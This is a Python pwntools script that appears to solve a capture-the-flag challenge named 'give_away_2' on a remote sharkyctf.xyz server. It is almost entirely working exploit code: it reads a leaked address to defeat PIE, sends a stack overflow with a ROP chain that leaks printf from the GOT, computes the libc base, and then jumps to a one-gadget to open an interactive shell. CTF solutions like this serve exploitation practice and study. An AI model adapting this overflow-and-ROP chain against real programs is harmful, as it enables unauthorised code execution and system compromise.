from pwn import *
target=remote('sharkyctf.xyz',20335)
#target=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.27.so','./give_away_2'],env={"LD_PRELOAD":"./libc-2.27.so"})
libc=ELF('./libc-2.27.so')

context.terminal=["tmux","split","-h"]
#gdb.attach(target,gdbscript="pie breakpoint *(0x861-0x202000)")

#use leak to caluclate base address of libc and code
print(target.recvuntil("away: "))
pie_main=int(target.recvline().strip("\n"),16)
pie_base=pie_main-0x864
print(hex(pie_base))
#important gadgets
poprdi=pie_base+0x903
poprsir15=pie_base+0x901
ret=pie_base+0x676
printf_got=pie_base+0x200fc0
printf_plt=pie_base+0x690
restart=pie_base+0x841
#payload
payload="A"*0x28
payload+=p64(ret)
payload+=p64(poprdi)
payload+=p64(printf_got)
payload+=p64(printf_plt)
payload+=p64(restart)
payload+=p64(0x0)
target.sendline(payload)
leak=target.recv(6)
libc_printf=u64(leak+"\x00"*2)
libc_base=libc_printf-libc.symbols["printf"]
print(hex(libc_base))
#important libc addresses
libc_system=libc_base+libc.symbols["system"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
libc_execve=libc_base+libc.symbols["execlp"]
#magic gadget
gadget=0x4f322
libc_gadget=libc_base+gadget
payload="A"*0x28
payload+=p64(libc_gadget)
payload+=p64(0x0)*10
target.send(payload)
target.interactive()
